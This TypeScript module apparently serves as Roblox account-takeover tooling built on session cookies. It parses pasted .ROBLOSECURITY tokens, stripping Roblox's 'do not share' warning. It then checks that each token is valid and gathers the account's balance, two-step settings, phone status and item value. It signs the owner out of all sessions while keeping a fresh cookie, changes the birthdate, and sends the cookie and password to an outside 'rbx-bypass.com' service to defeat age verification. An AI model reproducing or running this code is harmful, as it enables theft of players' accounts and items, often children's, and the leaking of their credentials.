import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import { wrapper } from 'axios-cookiejar-support';
import { logger } from './logger';

const AXIOS_TIMEOUT = 30000;
const MAX_RETRIES = 3;
const RETRY_DELAY = 1000;

axios.interceptors.request.use(config => {
  logger.debug({ url: config.url, method: config.method }, 'Outgoing request');
  return config;
});

axios.interceptors.response.use(
  response => {
    logger.debug({ status: response.status, url: response.config.url }, 'Response received');
    return response;
  },
  error => {
    logger.error({ err: error, url: error.config?.url }, 'Request failed');
    return Promise.reject(error);
  }
);

async function axiosWithRetry<T>(
  method: 'get' | 'post' | 'patch',
  url: string,
  options: any = {},
  retries = MAX_RETRIES
): Promise<T> {
  let lastError: any;
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const resp = await axios[method](url, {
        ...options,
        timeout: AXIOS_TIMEOUT,
        validateStatus: () => true,
      });
      return resp as T;
    } catch (err: any) {
      lastError = err;
      if (attempt < retries) {
        const delay = RETRY_DELAY * Math.pow(2, attempt) + Math.random() * 500;
        logger.debug(`Retry ${attempt} for ${url} in ${delay}ms`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  throw lastError;
}

export function extractCookie(raw: string): string | null {
  const trimmed = raw.trim();
  const fullMatch = trimmed.match(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(CAEQ[A-Za-z0-9._\-+=\/]+)/);
  if (fullMatch) return fullMatch[1];
  const bareMatch = trimmed.match(/^CAEQ[A-Za-z0-9._\-+=\/]+$/);
  if (bareMatch) return bareMatch[0];
  const codeFenceMatch = trimmed.match(/```(?:[a-z]*\n)?([A-Za-z0-9._\-+=\/]+)```/);
  if (codeFenceMatch) return extractCookie(codeFenceMatch[1]);
  if (/^CAEQ[A-Za-z0-9._\-+=\/]{50,}$/.test(trimmed)) return trimmed;
  return null;
}

export async function validateCookie(cookie: string, maxAttempts = 4): Promise<{
  valid: boolean;
  userId?: number;
  username?: string;
  displayName?: string;
  debug: string;
  isNetworkError: boolean;
}> {
  const debugLines: string[] = [];
  const log = (msg: string) => debugLines.push(msg);

  const rawCookie = extractCookie(cookie);
  if (!rawCookie) {
    log('No valid cookie token found');
    return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
  }

  const trimmed = rawCookie.trim();

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
      const client = wrapper(axios.create({ jar }));

      const resp = await client.get('https://users.roblox.com/v1/users/authenticated', {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
        validateStatus: () => true,
        timeout: AXIOS_TIMEOUT,
      });

      log(`Attempt ${attempt}: status ${resp.status}`);
      if (resp.status === 200) {
        const data = resp.data;
        return {
          valid: true,
          userId: data.id,
          username: data.name,
          displayName: data.displayName,
          debug: debugLines.join('\n'),
          isNetworkError: false,
        };
      }
      if (resp.status === 401) {
        log('Cookie invalid (401)');
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: false };
      }
      if (resp.status === 429 || resp.status === 530) {
        log(`Rate limited or Cloudflare error (${resp.status})`);
        if (attempt < maxAttempts) {
          const delay = Math.min(1000 * Math.pow(2, attempt), 10000) + Math.random() * 1000;
          log(`Waiting ${Math.round(delay)}ms before retry`);
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
      }
    } catch (err: any) {
      log(`Attempt ${attempt} error: ${err.message}`);
      if (attempt === maxAttempts) {
        const isNetwork = err.message.includes('getaddrinfo') || err.message.includes('ENOTFOUND') || err.message.includes('ETIMEDOUT') || err.code === 'ECONNRESET';
        return { valid: false, debug: debugLines.join('\n'), isNetworkError: isNetwork };
      }
      const delay = Math.min(1000 * Math.pow(2, attempt), 8000) + Math.random() * 1000;
      log(`Waiting ${Math.round(delay)}ms before retry`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }

  return {
    valid: false,
    debug: debugLines.join('\n'),
    isNetworkError: true,
  };
}

export async function fetchCreditBalance(cookie: string): Promise<{ balance: number; currency: string }> {
  try {
    const resp = await axios.get('https://billing.roblox.com/v1/credit', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      validateStatus: () => true,
      timeout: 10000,
    });
    if (resp.status === 200) {
      return { balance: resp.data.balance || 0, currency: resp.data.currencyCode || 'USD' };
    }
  } catch (err) { logger.error({ err }, 'fetchCreditBalance'); }
  return { balance: 0, currency: 'USD' };
}

export async function fetchTwoStepConfig(cookie: string, userId: string): Promise<{ email: boolean; authenticator: boolean }> {
  try {
    const resp = await axios.get(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      validateStatus: () => true,
      timeout: 10000,
    });
    if (resp.status === 200 && resp.data.methods) {
      const methods = resp.data.methods || [];
      const email = methods.some(m => m.mediaType === 'Email' && m.enabled);
      const authenticator = methods.some(m => m.mediaType === 'Authenticator' && m.enabled);
      return { email, authenticator };
    }
  } catch (err) { logger.error({ err }, 'fetchTwoStepConfig'); }
  return { email: false, authenticator: false };
}

export async function fetchPhoneInfo(cookie: string): Promise<{ hasPhone: boolean; verified: boolean }> {
  try {
    const resp = await axios.get('https://accountinformation.roblox.com/v1/phone', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      validateStatus: () => true,
      timeout: 10000,
    });
    if (resp.status === 200) {
      const data = resp.data;
      return { hasPhone: !!data.countryCode && !!data.phone, verified: data.isVerified || false };
    }
  } catch (err) { logger.error({ err }, 'fetchPhoneInfo'); }
  return { hasPhone: false, verified: false };
}

export async function fetchRolimonsRAP(userId: string): Promise<{ rap: number | null; premium: boolean }> {
  try {
    const resp = await axios.get(`https://api.rolimons.com/players/v1/playerinfo/${userId}`, {
      validateStatus: () => true,
      timeout: 10000,
    });
    if (resp.status === 200 && resp.data.success) {
      const data = resp.data;
      return {
        rap: data.rap !== undefined && data.rap !== null ? data.rap : null,
        premium: data.premium || false,
      };
    }
  } catch (err) { logger.error({ err }, 'fetchRolimonsRAP'); }
  return { rap: null, premium: false };
}

export async function refreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
  try {
    const trimmed = cookie.trim();
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${trimmed}; Domain=.roblox.com; Path=/`, 'https://auth.roblox.com');
    const client = wrapper(axios.create({ jar }));

    const baseHeaders = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    };

    const csrfResp = await client.post('https://auth.roblox.com/v2/logout', {}, {
      headers: baseHeaders,
      validateStatus: () => true,
      timeout: AXIOS_TIMEOUT,
    });
    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
    if (!csrf) {
      return { success: false, newCookie: null, error: `CSRF missing (${csrfResp.status})` };
    }

    const refreshHeaders = { ...baseHeaders, 'X-CSRF-TOKEN': csrf };
    const refreshResp = await client.post('https://auth.roblox.com/v2/session/refresh', {}, {
      headers: refreshHeaders,
      validateStatus: () => true,
      timeout: AXIOS_TIMEOUT,
    });
    if (refreshResp.status !== 200) {
      return { success: false, newCookie: null, error: `Refresh failed (${refreshResp.status})` };
    }

    const setCookie = refreshResp.headers['set-cookie'];
    let newCookie: string | null = null;
    if (setCookie) {
      const raw = Array.isArray(setCookie) ? setCookie.join(';') : setCookie;
      const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
      if (match) newCookie = match[1];
    }
    if (!newCookie) {
      return { success: false, newCookie: null, error: 'No new cookie in response' };
    }
    return { success: true, newCookie };
  } catch (err: any) {
    return { success: false, newCookie: null, error: err.message };
  }
}

export async function killAndRefreshSession(cookie: string): Promise<{ success: boolean; newCookie: string | null; error?: string }> {
  try {
    const cleanCookie = cookie.trim();
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cleanCookie}; Domain=.roblox.com; Path=/`, 'https://roblox.com');
    const client = wrapper(axios.create({ jar }));
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Origin': 'https://www.roblox.com',
      'Referer': 'https://www.roblox.com/',
    };

    let newCookie: string | null = null;
    let authResp;

    for (let attempt = 0; attempt < 3; attempt++) {
      authResp = await client.post('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {}, {
        headers,
        validateStatus: () => true,
        timeout: AXIOS_TIMEOUT,
      });
      if (authResp.status === 403) {
        const csrf = authResp.headers['x-csrf-token'];
        if (csrf) {
          headers['X-CSRF-TOKEN'] = csrf;
          authResp = await client.post('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {}, {
            headers,
            validateStatus: () => true,
            timeout: AXIOS_TIMEOUT,
          });
        }
      }
      if (authResp.status === 200) {
        const cookies = jar.getCookiesSync('https://roblox.com');
        const c = cookies.find(c => c.key === '.ROBLOSECURITY');
        if (c) newCookie = decodeURIComponent(c.value);
        if (!newCookie && authResp.headers['set-cookie']) {
          const raw = Array.isArray(authResp.headers['set-cookie'])
            ? authResp.headers['set-cookie'].join(';')
            : authResp.headers['set-cookie'];
          const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match) newCookie = match[1];
        }
        if (newCookie) break;
      }
      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (!newCookie || authResp?.status !== 200) {
      return { success: false, newCookie: null, error: `Reset failed with status ${authResp?.status}` };
    }
    return { success: true, newCookie };
  } catch (err: any) {
    return { success: false, newCookie: null, error: err.message };
  }
}

export async function getCsrfToken(): Promise<string | null> {
  try {
    const jar = new CookieJar();
    const client = wrapper(axios.create({ jar }));
    const resp = await client.post('https://auth.roblox.com/v2/logout', {}, {
      headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
      validateStatus: () => true,
      timeout: 10000,
    });
    if (resp.status === 403) {
      return resp.headers['x-csrf-token'] || null;
    }
    return null;
  } catch {
    return null;
  }
}

export async function updateBirthdate(cookie: string, birthdate: string, password?: string): Promise<{ success: boolean; status: number; message?: string }> {
  try {
    const csrf = await getCsrfToken();
    if (!csrf) {
      return { success: false, status: 0, message: 'Failed to get CSRF token' };
    }
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
    const client = wrapper(axios.create({ jar }));
    const payload: any = { birthdate };
    if (password) payload.password = password;
    const resp = await client.post('https://users.roblox.com/v1/birthdate', payload, {
      headers: {
        'X-CSRF-TOKEN': csrf,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      validateStatus: () => true,
    });
    if (resp.status === 200) {
      return { success: true, status: 200, message: 'Birthdate updated successfully' };
    }
    let message = `HTTP ${resp.status}`;
    try {
      const data = resp.data;
      if (data.errors && data.errors.length) {
        message = data.errors[0].message || message;
      }
    } catch {}
    return { success: false, status: resp.status, message };
  } catch (err: any) {
    return { success: false, status: 0, message: err.message };
  }
}

export async function bypassAgeVerification(cookie: string, password: string): Promise<{
  success: boolean;
  message: string;
  newCookie?: string;
  inProgress?: boolean;
}> {
  try {
    const resp = await axios.post(
      'https://rbx-bypass.com/api/public/bypass',
      { cookie, password },
      {
        headers: {
          'authority': 'rbx-bypass.com',
          'accept': '*/*',
          'content-type': 'application/json',
          'origin': 'https://rbx-bypass.com',
          'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        },
        timeout: AXIOS_TIMEOUT,
        validateStatus: () => true,
      }
    );
    if (typeof resp.data === 'string' && resp.data.trim() === 'Loading...') {
      return { success: false, message: 'Loading...', inProgress: true };
    }
    if (typeof resp.data === 'object' && resp.data !== null) {
      const data = resp.data;
      if (data.success === true) {
        return { success: true, message: data.message || 'Success', newCookie: data.cookie || undefined };
      }
      if (data.error === 'BYPASS_IN_PROGRESS') {
        return { success: false, message: 'Progressing..', inProgress: true };
      }
      return { success: false, message: data.message || data.error || 'Unknown error' };
    }
    return { success: false, message: `Unexpected response: ${resp.data}` };
  } catch (err: any) {
    if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
      return { success: false, message: 'Progressing..', inProgress: true };
    }
    if (err.code === 'ECONNRESET' || err.message?.includes('socket disconnected')) {
      return { success: false, message: 'Network error, please retry.' };
    }
    return { success: false, message: err.message || 'Unknown error' };
  }
}